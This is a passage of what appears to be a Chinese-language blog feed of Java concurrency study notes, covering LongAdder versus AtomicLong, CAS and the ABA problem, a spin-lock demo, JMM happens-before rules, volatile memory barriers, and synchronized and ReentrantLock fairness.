punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        longAdder<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        longAdder<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>longAdder<span class="token punctuation">.</span><span class="token function">longValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LongAccumulator</span> longAccumulator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LongAccumulator</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">-></span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        longAccumulator<span class="token punctuation">.</span><span class="token function">accumulate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        longAccumulator<span class="token punctuation">.</span><span class="token function">accumulate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        longAccumulator<span class="token punctuation">.</span><span class="token function">accumulate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>longAccumulator<span class="token punctuation">.</span><span class="token function">longValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="增强类-Adder、Accumulator-和Atomic的区别？"><a href="#增强类-Adder、Accumulator-和Atomic的区别？" class="headerlink" title="增强类(Adder、Accumulator)和Atomic的区别？"></a>增强类(Adder、Accumulator)和Atomic的区别？</h3><p>具体：LongAdder 与 AtomicLong有什么区别？</p><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><code>AtomicLong</code>是作者<code>Doug Lea</code>在<code>jdk1.5</code>版本发布于<code>java.util.concurrent.atomic</code>并发包下的类。<br>而<code>LongAdder</code>是<code>道格·利（Doug Lea的中文名）</code>在<code>java8</code>中发布的类。</p><h4 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h4><p>AtomicLong底层是通过<code>CAS</code>实现的，采用volatile+Unsafe类来实现。</p><p>缺点：</p><p>1、在多线程竞争不激烈的情况下，这样做是合适的。但是如果线程竞争激烈，会造成大量线程在原地打转、不停尝试去修改值，但是老是发现值被修改了，于是继续自旋。 这样浪费了大量的<code>CPU资源</code>。</p><p>2、volatile，线程修改了临界资源后，需要刷新到其他线程，也会浪费资源</p><p>注意：Adder的实现sum求和后还有计算线程修改结果的话，最后<code>结果不够准确</code></p><h2 id="Striped64类"><a href="#Striped64类" class="headerlink" title="Striped64类"></a>Striped64类</h2><p>LongAdder是Striped64的子类</p><h3 id="核心参数"><a href="#核心参数" class="headerlink" title="核心参数"></a>核心参数</h3><p>Striped64有几个比较重要的成员函数</p><ul><li><p>static final int NCPU &#x3D; Runtime.getRuntime().availableProcessors();</p><p>CPU数量，即cells数组的最大长度</p></li><li><p>transient volatile Cell[] cells; </p><p>cells数组，为2的幂，2,4,8,16…..，方便以后位运算</p></li><li><p>transient volatile long base;</p><p>基础value值，当并发较低时，只累加该值主要用于没有竞争的情况，通过CAS更新。</p></li><li><p>transient volatile int cellsBusy;</p></li></ul><p>​创建或者扩容Cells数组时使用的自旋锁变量调整单元格大小（扩容），创建单元格时使用的锁。</p><h3 id="LongAdder实现原理："><a href="#LongAdder实现原理：" class="headerlink" title="LongAdder实现原理："></a>LongAdder实现原理：</h3><p>LongAdder的基本思路就是分散热点，将value值分散到一个Cell数组中，不同线程会命中到数组的不同槽中，各个线程只对自己槽中的那个值进行CAS操作，这样热点就被分散了，冲突的概率就小很多。如果要获取真正的long值，只要将各个槽中的变量值累加返回。</p><p>sum()会将所有Cell数组中的value和base累加作为返回值，核心的思想就是将之前AtomicLong一个value的更新压力分散到多个value中去</p><p><img src="/JUC-%E5%85%AD-%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E7%B1%BB%E5%8F%8A%E5%8D%81%E5%85%AB%E7%BD%97%E6%B1%89%E5%A2%9E%E5%BC%BA.assets/image-20220622220924965.png" alt="image-20220622220924965"></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220622221141680.png" alt="image-20220622221141680"></p><h3 id="为啥在并发情况下longAdder的sum的值不精确？"><a href="#为啥在并发情况下longAdder的sum的值不精确？" class="headerlink" title="为啥在并发情况下longAdder的sum的值不精确？"></a>为啥在并发情况下longAdder的sum的值不精确？</h3>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(五)-CAS</title>
    <link href="/posts/16f16ca5.html"/>
    <url>/posts/16f16ca5.html</url>
    
    <content type="html"><![CDATA[<p> CAS底层原理和UnSafe的理解,自旋锁，ABA问题解决</p><span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>CAS（Compare-and-Swap），即比较并替换</p><p>没有使用原子类之前：采用volatile+synchronized重锁机制保证并发安全</p><p>使用原子类之后：Atomic时候无需加锁保证安全</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>CAS有三个操作数，位置内存值V，旧的预期值A,要修改的更新值B。</p><p>当且仅当旧的预期值A和内存V相同时，将内存值V修改为B,否则就什么都不做或者<code>重来</code></p><h3 id="Unsafe类（开发时候不要使用，线程不安全）"><a href="#Unsafe类（开发时候不要使用，线程不安全）" class="headerlink" title="Unsafe类（开发时候不要使用，线程不安全）"></a>Unsafe类（开发时候不要使用，线程不安全）</h3><p>Unsafe类中方法都是natice修饰的本地方法。也就是说Unsafe类的方法是直接调用操作系统底层资源执行相应任务</p><p>Unsafe提供的CAS方法，底层实现即为CPU指令cmpxchg,也就是说CAS的原子性实际上是CPU实现的，cmpxchg会在多核系统总线加锁。</p><h2 id="原子类AtomicXXX"><a href="#原子类AtomicXXX" class="headerlink" title="原子类AtomicXXX"></a>原子类AtomicXXX</h2><blockquote><p>Atomic原理就是使用cas+volatile+native实现的</p></blockquote><p>结合java内存模型</p><h3 id="AtomicInteger"><a href="#AtomicInteger" class="headerlink" title="AtomicInteger"></a>AtomicInteger</h3><p>假设线程A和线程B两个线程同时执行getAndAddInt操作（分别跑在不同CPU上）：</p><p>1  AtomicInteger里面的value原始值为3，即主内存中AtomicInteger的value为3，根据JMM模型，线程A和线程B各自持有一份值为3的value的副本分别到各自的工作内存。</p><p>2  线程A通过getIntVolatile(var1, var2)拿到value值3，这时线程A被挂起。</p><p>3  线程B也通过getIntVolatile(var1, var2)方法获取到value值3，此时刚好线程B没有被挂起并执行compareAndSwapInt方法比较内存值也为3，成功修改内存值为4，线程B打完收工，一切OK。</p><p>4  这时线程A恢复，执行compareAndSwapInt方法比较，发现自己手里的值数字3和主内存的值数字4不一致，说明该值已经被其它线程抢先一步修改过了，那A线程本次修改失败，<code>只能重新读取重新来一遍了</code>。</p><p>5  线程A重新获取value值，因为变量value被volatile修饰，所以其它线程对它的修改，线程A总是能够看到，线程A继续执行compareAndSwapInt进行比较替换，直到成功。</p><h3 id="AtomicReference"><a href="#AtomicReference" class="headerlink" title="AtomicReference"></a>AtomicReference</h3><p>AtomicReference<Order> atomicReferenceUser &#x3D; new AtomicReference&lt;&gt;();</p><p>这里Order 例指所有业务对象</p><p>atomicReferenceUser .compareAndSet</p><h2 id="自旋锁-spinlock"><a href="#自旋锁-spinlock" class="headerlink" title="自旋锁(spinlock)"></a>自旋锁(spinlock)</h2><blockquote><p>尝试获取锁的线程不会立即阻塞，而是采用循环的方式去尝试获取锁,当线程发现锁被占用时，会不断循环判断锁的状态，直到获取.</p></blockquote><p>好处是减少线程上下文切换的消耗，缺点是循环会消耗CPU</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicReference</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/19 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpinLockDemo</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">AtomicReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Thread</span><span class="token punctuation">></span></span> atomicReference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">myLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\t come in"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>atomicReference<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> thread<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">myUnLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        atomicReference<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>thread<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\t myUnLock over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpinLockDemo</span> spinLockDemo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpinLockDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            spinLockDemo<span class="token punctuation">.</span><span class="token function">myLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            spinLockDemo<span class="token punctuation">.</span><span class="token function">myUnLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//暂停一会儿线程，保证A线程先于B线程启动并完成</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            spinLockDemo<span class="token punctuation">.</span><span class="token function">myLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            spinLockDemo<span class="token punctuation">.</span><span class="token function">myUnLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="CAS缺点及ABA问题"><a href="#CAS缺点及ABA问题" class="headerlink" title="CAS缺点及ABA问题"></a>CAS缺点及ABA问题</h2><p>1、如果CAS失败，会一直进行尝试。如果CAS长时间一直不成功，造成锁饥饿，可能会给CPU带来很大的开销。</p><p>2、CAS会导致“ABA问题”。</p><p>比如说一个线程one从内存位置V中取出A，这时候另一个线程two也从内存中取出A，并且线程two进行了一些操作将值变成了B，<br>然后线程two又将V位置的数据变成A，这时候线程one进行CAS操作发现内存中仍然是A，然后线程one操作成功。</p><p>尽管线程one的CAS操作成功，但是不代表这个过程就是没有问题的。</p><h3 id="ABA问题的解决（AtomicStampedReference-）"><a href="#ABA问题的解决（AtomicStampedReference-）" class="headerlink" title="ABA问题的解决（AtomicStampedReference ）"></a>ABA问题的解决（AtomicStampedReference ）</h3><p> atomicStampedReference.getStamp();</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(四)-Java内存模型之JMM</title>
    <link href="/posts/f189a462.html"/>
    <url>/posts/f189a462.html</url>
    
    <content type="html"><![CDATA[<p>Java内存模型下对变量的规则，多线程下变量赃读取脏写的原因，内存屏障及其原理分析，以及Volatile的关键字的作用，原理。使用场景</p><span id="more"></span><p>Java并发多线程与高并发(二)-并发基础 已经对概念进行的基础的覆盖，接下来逐步加深</p><h2 id="多线程先行发生原则之happens-before"><a href="#多线程先行发生原则之happens-before" class="headerlink" title="多线程先行发生原则之happens-before"></a>多线程先行发生原则之happens-before</h2><h3 id="happens-before之8条"><a href="#happens-before之8条" class="headerlink" title="happens-before之8条"></a>happens-before之8条</h3><ul><li><strong>程序次序规则</strong>（Program Order Rule）：写在前面的操作先行发生于写在后面的操作</li><li><strong>管程锁定规则</strong>（Monitor Lock Rule）：一个 unlock 操作先行发生于后面对同一个锁的 lock 操作</li><li><strong>volatile 变量规则</strong>（Volatile Variable Rule）：对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作，<strong>前面的写对后面的读是可见的</strong>。这里的 “后面” 同样是指时间上的先后。</li><li><strong>传递性</strong>（Transitivity）：如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那就可以得出操作 A 先行发生于操作 C 的结论。</li><li><strong>线程启动规则</strong>（Thread Start Rule）：Thread 对象的 start() 方法先行发生于此线程的每一个动作。</li><li><strong>线程中断规则</strong>（Thread Interruption Rule）：对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 Thread 对象的 interrupted() 方法检测到是否有中断发生。</li><li><strong>线程终止规则</strong>（Thread Termination Rule）：<strong>线程中的所有操作都先行发生于对此线程的终止检测。</strong>我们可以通过 Thread 对象的 join() 方法是否结束、Thread 对象的 isAlive() 的返回值等手段检测线程是否已经终止执行。</li><li><strong>对象终结规则</strong>（Finalizer Rule）：一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。</li></ul><h2 id="Volatile内存屏障（难点）"><a href="#Volatile内存屏障（难点）" class="headerlink" title="Volatile内存屏障（难点）"></a>Volatile内存屏障（难点）</h2><blockquote><p>并发编程的三大问题：原子性 可见性  有序性</p><p>volatile 保证了可见性和有序性</p></blockquote><p>volatile：</p><p>当写一个volatile变量时，JMM会把该线程对应的本地内存中的共享变量值<code>立即刷新回主存</code>中</p><p>当读一个volatile变量时，JMM会把该线程对应的本地内存设置为无效，直接从主存中读取共享变量 </p><p>所以volatile的写内存语义是直接刷新到主内存中，读的内存语义是直接从主内存中读取</p><h3 id="内存屏障-保证了可见性"><a href="#内存屏障-保证了可见性" class="headerlink" title="内存屏障(保证了可见性)"></a>内存屏障(保证了可见性)</h3><p>内存屏障指令，Java内存模型的重排规则会要求Java编译器在生成JVM指令时插入特定的内存屏障指令</p><p>对一个volatie域的写，happens-before与任意后续对这个volatile域的读，也叫写后读</p><p> 底层是C++</p><p>loadload  storestore  loadstore  storeload 四个内存屏障策略</p><table><thead><tr><th>屏障类型</th><th>指令示例</th><th>说明</th></tr></thead><tbody><tr><td>loadload</td><td>load1;loadload;load2</td><td>保证load1读取操作在load2读取操作之前执行</td></tr><tr><td>storestore</td><td>store1;storestore;store2</td><td>在store2及其后的写操作执行前，保证store1的写操作已经刷新到主内存</td></tr><tr><td>loadstore</td><td>load1;storestore;store2</td><td>在store2及其后的写操作执行前，保证load1的读操作已读取结束</td></tr><tr><td>storeload</td><td>store1;storestore;load2</td><td>保证store1的写操作已刷新到主内存之后，load之后的读操作才能执行</td></tr></tbody></table><p>总结：（重点）</p><p>1、当第一个操作Volatile读时候，无论第二个操作是什么，都不能重排序，保证Volatile读之后的操作不会重排序到Volatile读之前</p><p>2、当第二个操作是Volatile写时候，无论第一个操作是什么，都不能重排序，保证Volatile写之前的操作不会被重排序到Volatile写之后</p><p>3、当第一个操作是Volatile写时，第二个操作是Volatile读时，不能重排</p><p>延伸：使用两个Volatile时候，只有第一个是Volatile读，第二个也是Volatile读才可以重排，其他所有情况均不可以重排</p><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><p>写总结：</p><p>1、在每个volatile写操作的前面插入一个storestore屏障</p><p>2、在每个volatile写操作的后面插入一个storeload屏障</p><p>读总结</p><p>1、在每个volatile读操作后面插入一个loadload屏障</p><p>2、在每个volatile读操作后面插入一个loadstore屏障</p><h2 id="Volatile变量的读写过程"><a href="#Volatile变量的读写过程" class="headerlink" title="Volatile变量的读写过程"></a>Volatile变量的读写过程</h2><blockquote><p><strong>read(读取)→load(加载)→use(使用)→assign(赋值)→store(存储)→write(写入)→lock(锁定)→unlock(解锁)</strong></p></blockquote><p>read： 作用于主内存，将变量的值从主内存传输到工作内存，主内存到工作内存。</p><p>laod：作用于工作内存，将read从主内存传输的变量值放入工作内存变量副本中，即数据加载。</p><p>use：作用于工作内存，将工作内存变量副本的值传递给执行引擎，每当JVM遇到需要该变量的字节码指令时会执行该操作。</p><p>assign：作用于工作内存，将从执行引擎接收到的值赋值给工作内存变量，每当JVM遇到一个给变量赋值字节码指令时会执行该操作。</p><p>write：作用于主内存，将store传输过来的变量值赋值给主内存中的变量。</p><p>由于上述操作，只能保证单条指令的原子性，针对多条指令的组合性原子保证，没有大面积加锁，所以JVM另外提供了两个原子指令：</p><p>lock：作用于主内存，将一个变量标记为一个线程独占的状态，只是写时候加锁，就只是锁了写变量的过程。</p><p>unlock：作用于主内存，将一个处于锁定状态的变量释放，然后才能被其它线程占用。</p><h2 id="Volatile-为什么没有原子性？"><a href="#Volatile-为什么没有原子性？" class="headerlink" title="Volatile 为什么没有原子性？"></a>Volatile 为什么没有原子性？</h2><p>复合性的操作不具有原子性</p><p>example:i++</p><p>i++ 被拆分处理三个指令：</p><p>1、getfield拿到原始i</p><p>2、执行iadd进行加一操作</p><p>3、执行putfield把累加后的值写回</p><p>如果第二个线程在第一个线程读取旧值和写回新值期间读取了i的值，那么第二个线程就会和第一个线程看到同一个值，并执行加一操作，导致线程安全失败。</p><h3 id="本质原因"><a href="#本质原因" class="headerlink" title="本质原因"></a>本质原因</h3><p>内存屏障保证了read(读取)→load(加载)→use(使用)  以及assign(赋值)→store(存储)→write(写入)成为了两个不可分割的原子操作，但是在use和assign之间依然有真空期，这个时候如i++ 这样多个操作就会导致多线程安全问题</p><h2 id="Volatile的应用场景"><a href="#Volatile的应用场景" class="headerlink" title="Volatile的应用场景"></a>Volatile的应用场景</h2><blockquote><p>通常用作保存某个boolean 或者 int 值</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(三)-Java的“锁”事</title>
    <link href="/posts/f60080de.html"/>
    <url>/posts/f60080de.html</url>
    
    <content type="html"><![CDATA[<p> Java的锁通过悲观乐观，由浅入深，循序渐进，</p><span id="more"></span><h2 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h2><p>总是假设最坏的情况，每次取数据时都认为其他线程会修改，所以都会加（悲观）锁。一旦加锁，不同线程同时执行时,只能有一个线程执行，其他的线程在入口处等待，直到锁被释放。</p><p>应用场景：</p><ul><li><code>MySQL</code>的读锁、写锁、行锁等</li><li><code>Java</code>的<code>synchronized</code>关键字</li><li><strong>Synchronized</strong></li><li><strong>ReentrantLock</strong></li></ul><h2 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h2><p>它总认为资源和数据不会被别人所修改，所以读取不会上锁，但是乐观锁在进行写入操作的时候会判断当前数据是否被修改过，乐观锁的实现方案一般来说有两种：<code>版本号机制</code> 和 <code>CAS实现</code></p><p>应用场景：</p><p>AtomicIntegter</p><h2 id="Synchronized详解"><a href="#Synchronized详解" class="headerlink" title="Synchronized详解"></a>Synchronized详解</h2><h3 id="锁在普通方法上（Synchronized修饰普通方法）"><a href="#锁在普通方法上（Synchronized修饰普通方法）" class="headerlink" title="锁在普通方法上（Synchronized修饰普通方法）"></a>锁在普通方法上（Synchronized修饰普通方法）</h3><blockquote><p>对象锁</p></blockquote><ul><li>一个对象里面如果有多个<strong>Synchronized方法</strong>，同一时刻内，只要一个线程去调用其中的一个Synchronized方法，其他线程只能等待。<strong>锁的是当前对象this,被锁定后其他线程都不能进入当前对象的其他Synchronized方法</strong></li><li>普通方法和锁无关，不影响访问</li><li>换成不同的对象后，就不是同一把锁了，不同对象之间不受影响</li></ul><h3 id="锁在static方法上（Synchronized修饰static方法）"><a href="#锁在static方法上（Synchronized修饰static方法）" class="headerlink" title="锁在static方法上（Synchronized修饰static方法）"></a>锁在static方法上（Synchronized修饰static方法）</h3><blockquote><p>类锁</p></blockquote><ul><li>类锁后，也就是锁定了当前的Class对象。即使创建了不同对象，也是谁先获得类锁谁先执行</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 对于普通同步方法，锁的是当前实例对象，通常指this</p><p>对于静态同步方法，锁的是当前类的class对象</p><p>对于同步方法快，锁的是<strong>Synchronized</strong>括号内的对象</p><h2 id="公平锁和非公平锁"><a href="#公平锁和非公平锁" class="headerlink" title="公平锁和非公平锁"></a>公平锁和非公平锁</h2><p>example: </p><p>ReentrantLock lock &#x3D; new ReentrantLock();  &#x2F;&#x2F;默认非公平锁</p><p>ReentrantLock lock &#x3D; new ReentrantLock(true);  &#x2F;&#x2F;公平锁</p><h3 id="公平锁："><a href="#公平锁：" class="headerlink" title="公平锁："></a>公平锁：</h3><p>​多个线程按照申请锁的顺序去获得锁，线程会直接进入队列去排队，永远都是队列的第一位才能得到锁</p><h3 id="非公平锁："><a href="#非公平锁：" class="headerlink" title="非公平锁："></a>非公平锁：</h3><p>​多个线程去获取锁的时候，会直接去尝试获取，获取不到，再去进入等待队列，如果能获取到，就直接获取到锁。</p><p>以ReentrantLock 源码为例</p><p>非公平锁的 tryAcquire</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">nonfairTryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">Thread</span> current <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> acquires<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> nextc <span class="token operator">=</span> c <span class="token operator">+</span> acquires<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nextc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// overflow</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Maximum lock count exceeded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setState</span><span class="token punctuation">(</span>nextc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 